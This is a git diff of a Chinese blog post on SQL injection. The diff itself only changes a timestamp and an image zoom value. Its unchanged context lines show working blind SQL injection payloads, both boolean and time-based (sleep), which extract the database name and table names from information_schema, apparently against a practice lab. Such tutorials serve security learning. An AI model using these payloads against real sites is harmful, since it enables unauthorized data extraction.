@@ -51,7 +51,7 @@ var _hmt = _hmt || [];
 <meta property="og:image" content="https://bolerat.github.io/pic/sz6.png">
 <meta property="og:image" content="https://bolerat.github.io/pic/ascii.jpg">
 <meta property="article:published_time" content="2023-07-31T13:38:00.000Z">
-<meta property="article:modified_time" content="2023-07-31T18:37:33.743Z">
+<meta property="article:modified_time" content="2023-07-31T18:38:35.991Z">
 <meta property="article:author" content="Bolerat">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="2">
@@ -344,7 +344,7 @@ var _hmt = _hmt || [];
 
 <p>通过ascii和subctr来判断数据库名的一个个字母，最终得到当前数据库名称：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(substr(database(),1,1))&#x3D;115 --+</span><br></pre></td></tr></table></figure>
-<img src="/pic/ascii.jpg" alt="1" style="zoom:70%" />
+<img src="/pic/ascii.jpg" alt="1" style="zoom:50%" />
 
 <h5 id="时间盲注（延迟注入）"><a href="#时间盲注（延迟注入）" class="headerlink" title="时间盲注（延迟注入）"></a>时间盲注（延迟注入）</h5><p>通过sleep函数使页面加载产生延迟来判断语句是否生效</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果数据库的长度等于8，则休眠5秒：</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(5),1) --+</span><br><span class="line"></span><br><span class="line">如果第一个表的第一个字母为a，则休眠5秒：</span><br><span class="line">?id&#x3D;1&#39; and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1)&#x3D;&#39;a&#39;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
@@ -395,7 +395,6 @@ var _hmt = _hmt || [];
 
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考资料：</span><br><span class="line">sql注入（三）绕过方法：https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_63306943&#x2F;article&#x2F;details&#x2F;130448875</span><br></pre></td></tr></table></figure>
-
       
 
 		   <!-- 添加版权声明 -->
